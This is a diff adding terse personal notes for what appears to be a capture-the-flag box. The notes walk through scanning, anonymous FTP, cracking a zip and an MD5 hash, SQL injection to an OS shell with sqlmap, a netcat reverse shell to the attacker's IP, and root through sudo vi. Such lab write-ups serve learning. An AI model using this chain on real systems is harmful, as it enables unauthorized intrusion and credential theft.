@@ -1,0 +1,25 @@
+1. apply masscan -p0-65535 <IP> -inte=1000 -e tun0
+1.1 apply nmap -sS -sC -sV -p21,22,80 -vvv -oN scan_veccine <IP>
+2. login ftp <IP> user anonymoys password: 
+2.1 get backup.zip
+3. extract hash algorithm with zip2john backup.zip 
+4. save in name hash_backup
+5. typing john --wordlist=/usr/share/wordlist/rockyou.txt
+5.1 backup's pasword 741852963
+6. let's search user and password in the files with
+6.1 grep -i -R "pass" i:without case and R:recursive
+7. apply hashcat -m 0 2cb42f8734ea607eefed3b70af13bbd3 /usr/share/wordlist/rockyou.txt
+or go page crackstation.net
+8.password=qwerty789
+9. open burn and intercep trafic of admin 
+10. create file with new.req and apply sqlmap	
+11. typing sqlmap -r new.req --os-shell
+12. create to reverse shell and let's go to page https://www.revshells.com
+12.1 and create with our ip and port (this case we chose 4444) with option
+nc mkfifo
+13. let's search pass in directory /var/www/html with grep -i -R "pass"
+14. login ssh with ssh postgres@<IP> password it found
+15. apply sudo -l and let's see to option /bin/vi /etc/postgresql/11/main/pg_hba.conf
+16. later sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+17. for last :shell or before :set shell=/bin/sh -> :shell
+18. access root 
